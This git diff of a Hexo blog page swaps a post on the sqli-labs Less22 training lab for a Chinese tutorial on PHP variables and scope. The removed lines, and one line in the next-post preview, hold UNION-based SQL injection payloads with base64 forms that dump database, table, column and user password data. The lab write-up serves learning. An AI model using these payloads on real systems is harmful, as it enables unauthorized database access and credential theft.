@@ -4,13 +4,14 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-labs Less22, Junk Blog">
-    <meta name="description" content="注入步骤
+    <meta name="keywords" content="PHP 变量, Junk Blog">
+    <meta name="description" content="基础
 
-暴库
-
-payload：-admin&#34; union select 1,user(),database()#
-base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
+变量用一个美元符号（$）后面跟变量名来表示。
+变量名称必须以字母或下划线开头
+变量名称不能以数字开头
+变量名称只能包含字母数字字符和下划线（A-z、0-9、下划线，以及 ASCII 字符从 127 到 255）
+变量名是区分大小写的">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +19,7 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqli-labs Less22 | Junk Blog</title>
+    <title>PHP 变量 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -288,13 +289,13 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('http://www.developersacademy.org/blog/wp-content/uploads/2018/04/php-1024x538.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        sqli-labs Less22
+                        PHP 变量
                     </div>
                 </div>
             </div>
@@ -386,12 +387,12 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sqli-labs/" target="_blank">
-                                <span class="chip bg-color">sqli-labs</span>
+                            <a href="/tags/Web/" target="_blank">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
-                            <a href="/tags/SQL-Injection/" target="_blank">
-                                <span class="chip bg-color">SQL Injection</span>
+                            <a href="/tags/php/" target="_blank">
+                                <span class="chip bg-color">php</span>
                             </a>
                         
                     </div>
@@ -402,8 +403,8 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                Web security
+                            <a href="/categories/编程/" class="post-category" target="_blank">
+                                编程
                             </a>
                         
                     </div>
@@ -421,14 +422,14 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        124
+                        1.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        4 分
                     </div>
                     
                 
@@ -444,31 +445,160 @@ base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><hr>
-<ol>
-<li><strong>暴库</strong></li>
-</ol>
-<pre class="line-numbers language-text"><code class="language-text">payload：-admin" union select 1,user(),database()#
-base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoKSM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/26/LHFi5MjPUdWJeSl.png" alt="less22-1.png"></p>
-<ol start="2">
-<li><strong>暴表</strong></li>
-</ol>
-<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#
-base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuVEFCTEVTIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/26/gQen9pUJYGC3jMm.png" alt="less22-2.png"></p>
-<ol start="3">
-<li><strong>暴字段</strong></li>
-</ol>
-<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#
-base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLkNPTFVNTlMgV0hFUkUgVEFCTEVfU0NIRU1BPSdzZWN1cml0eScgQU5EIFRBQkxFX05BTUU9J3VzZXJzJyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/26/RjsG6YMoTxJntWm.png" alt="less22-3.png"></p>
-<ol start="4">
-<li><strong>暴数据</strong></li>
-</ol>
-<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#
-base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIEZST00gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/26/UhRg2alQ7oLrTGA.png" alt="less22-4.png"></p>
+                <h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><hr>
+<ul>
+<li>变量用一个美元符号（$）后面跟变量名来表示。</li>
+<li>变量名称必须以字母或下划线开头</li>
+<li>变量名称不能以数字开头</li>
+<li>变量名称只能包含字母数字字符和下划线（A-z、0-9、下划线，以及 ASCII 字符从 127 到 255）</li>
+<li>变量名是区分大小写的。</li>
+</ul>
+<p><strong>示例：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">'Bob'</span><span class="token punctuation">;</span>
+<span class="token variable">$Var</span> <span class="token operator">=</span> <span class="token string">'Joe'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$var, $Var"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 输出 "Bob, Joe"</span>
+
+<span class="token variable">$4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 非法变量名；以数字开头</span>
+<span class="token variable">$_4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 合法变量名；以下划线开头</span>
+<span class="token variable">$i</span>站点is <span class="token operator">=</span> <span class="token string">'mansikka'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 合法变量名；可以用中文</span>
+<span class="token keyword">echo</span> <span class="token variable">$4site</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_4site</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$i</span>站点is<span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/pUYdNKynfkja67G.png" alt="phpvar-2.png"></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">'Bob'</span><span class="token punctuation">;</span>
+<span class="token variable">$Var</span> <span class="token operator">=</span> <span class="token string">'Joe'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$var, $Var"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 输出 "Bob, Joe"</span>
+
+<span class="token comment" spellcheck="true">///$4site = 'not yet';     // 非法变量名；以数字开头</span>
+<span class="token variable">$_4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 合法变量名；以下划线开头</span>
+<span class="token variable">$i</span>站点is <span class="token operator">=</span> <span class="token string">'mansikka'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 合法变量名；可以用中文</span>
+<span class="token comment" spellcheck="true">//echo $4site;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_4site</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$i</span>站点is<span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/jMaJ7QFkzl9OIL5.png" alt="phpvar-3.png"></p>
+<h3 id="创建变量（变量初始化）"><a href="#创建变量（变量初始化）" class="headerlink" title="创建变量（变量初始化）"></a>创建变量（变量初始化）</h3><hr>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//如果变量赋的值是字符串，需要用引号包围该值。</span>
+<span class="token variable">$txt</span><span class="token operator">=</span><span class="token string">"hello world!"</span><span class="token punctuation">;</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>
+<span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10.5</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/FuTx6zZkXMhia8A.png" alt="phpvar-1.png"></p>
+<p>php 变量的数据类型是不需要声明的，php 会根据它的值，自动把变量转换为正确的数据类型。</p>
+<p>注：当你不初始化变量，变量会根据数据类型设置相应的默认值。例如：布尔值默认为 FALSE，整数和浮点数默认为 0，字符串为 null，数组为 empty array。</p>
+<h2 id="PHP-变量的作用域"><a href="#PHP-变量的作用域" class="headerlink" title="PHP 变量的作用域"></a>PHP 变量的作用域</h2><hr>
+<p>在 php 中，可以在脚本的任意位置对变量进行声明。变量的作用域指的是变量的生效范围，变量能被哪些脚本调用。</p>
+<p>PHP 有三种不同的作用域：</p>
+<ul>
+<li>local（局部）</li>
+<li>global（全局）</li>
+<li>static（静态）</li>
+</ul>
+<h3 id="Local-和-Global-作用域"><a href="#Local-和-Global-作用域" class="headerlink" title="Local 和 Global 作用域"></a>Local 和 Global 作用域</h3><hr>
+<p>函数之外声明的变量拥有 Global 作用域，只能在函数以外进行访问。</p>
+<p>函数内部声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。</p>
+<p>下面的例子测试了带有局部和全局作用域的变量：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 全局作用域</span>
+
+<span class="token comment" spellcheck="true">//我们可以在不同的函数中创建名称相同的局部变量，因为局部变量只能被在其中创建它的函数识别。</span>
+
+<span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 局部作用域</span>
+  <span class="token keyword">echo</span> <span class="token string">"&lt;p>测试函数内部的变量：&lt;/p>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string">"变量 x 是：$x"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string">"变量 y 是：$y"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">"&lt;p>测试函数之外的变量：&lt;/p>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"变量 x 是：$x"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"变量 y 是：$y"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/EGXMPODyi4YqRkZ.png" alt="phpvar-4.png"></p>
+<p><strong>注：</strong></p>
+<p>什么是函数？</p>
+<p>函数是可以在程序中重复使用的语句块。简单来说就是把写的多行代码，整合在一起，变成一块代码，并为它设个名称。</p>
+<h3 id="PHP-global-关键词"><a href="#PHP-global-关键词" class="headerlink" title="PHP global 关键词"></a>PHP global 关键词</h3><hr>
+<p>global 关键词用于在函数内访问全局变量，需要在（函数内部）变量前面使用 global 关键词：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>
+<span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>
+  <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 15</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/AC4OaHLMikKQ9o5.png" alt="phpvar-5.png"></p>
+<p>PHP 同时在名为 $GLOBALS[index] 的数组中存储了所有的全局变量。下标存有变量名。这个数组在函数内也可以访问，并能够用于直接更新全局变量。</p>
+<p>上面的例子可以这样重写：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>
+<span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 15</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/EWoHUxJadjsFLbZ.png" alt="phpvar-6.png"></p>
+<h3 id="PHP-static-关键词"><a href="#PHP-static-关键词" class="headerlink" title="PHP static 关键词"></a>PHP static 关键词</h3><hr>
+<p>通常，当函数完成/执行后，会删除所有变量。不过，有时我需要不删除某个局部变量。实现这一点需要首次声明变量时使用 static 关键词：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">static</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
+  <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/aU5BTrkAH7DCxcm.png" alt="phpvar-7.png"></p>
+<p>注：然后，每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时所包含的信息。该变量仍然是函数的局部变量。</p>
+<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><hr>
+<p>可变变量就是，一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 普通变量</span>
+$<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'world'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 可变变量</span>
+<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$hello</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$a ${$a}"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$a $hello"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/30/Ud46wLCSoaiRfQg.png" alt="phpvar-8.png"></p>
+<p>要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 <code>$$a[1]</code> 时，解析器需要知道是想要 <code>$a[1]</code> 作为一个变量呢，还是想要 <code>$$a</code> 作为一个变量并取出该变量中索引为 <code>[1]</code> 的值。解决此问题的语法是，对第一种情况用 <code>${$a[1]}</code>，对第二种情况用 <code>${$a}[1]</code>。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr>
+<p><a href="https://www.w3school.com.cn/php/php_variables.asp" target="_blank" rel="noopener">PHP 变量</a></p>
+<p><a href="https://www.php.net/manual/zh/language.variables.php" target="_blank" rel="noopener">变量</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -510,7 +640,7 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                     </span>
                     <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/11/26/sqli-labs-Less22/" class="b-link-green">sqli-labs Less22</a>
+                    <a href="/2019/11/26/PHP变量/" class="b-link-green">PHP 变量</a>
                 </p>
             </div>
         </div>
@@ -531,9 +661,10 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/11/26/PHP变量/">
                     <div class="card-image">
@@ -552,9 +683,9 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 变量名称只能包含字母数字字符和下划线（A-z、0-9、下划线，以及 ASCII 字符从 127 到 255）
 变量名是区分大小写的</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -567,6 +698,7 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -589,17 +721,22 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/26/base64编码/">
+                <a href="/2019/11/26/sqli-labs-Less22/">
                     <div class="card-image">
                         
-                        <img src="https://tse3.mm.bing.net/th?id=OIP.FZZR6ilAZD0RTVKhJAYFTAHaEo&amp;pid=15.1" class="responsive-img" alt="base64编码">
                         
-                        <span class="card-title">base64编码</span>
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="sqli-labs Less22">
+                        
+                        <span class="card-title">sqli-labs Less22</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">编码
-我们知道，所有的信息最终都表示为一个二进制的字符串，每一个二进制位（bit）有 0 和 1 两种状态。当我们需要把字符 ‘A’ 存入计算机时，我们可以将字符 ‘A’ 用 01000010（这个随便编的）二进制字符串表示，存入计算机；读</div>
+                    <div class="summary">注入步骤
+
+暴库
+
+payload：-admin" union select 1,user(),database()#
+base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoK</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-26
@@ -608,8 +745,8 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/编码/" class="post-category" target="_blank">
-                                    编码
+                            <a href="/categories/Web-security/" class="post-category" target="_blank">
+                                    Web security
                                 </a>
                             
                             
@@ -619,8 +756,12 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/base64/" target="_blank">
-                        <span class="chip bg-color">base64</span>
+                    <a href="/tags/sqli-labs/" target="_blank">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL-Injection/" target="_blank">
+                        <span class="chip bg-color">SQL Injection</span>
                     </a>
                     
                 </div>
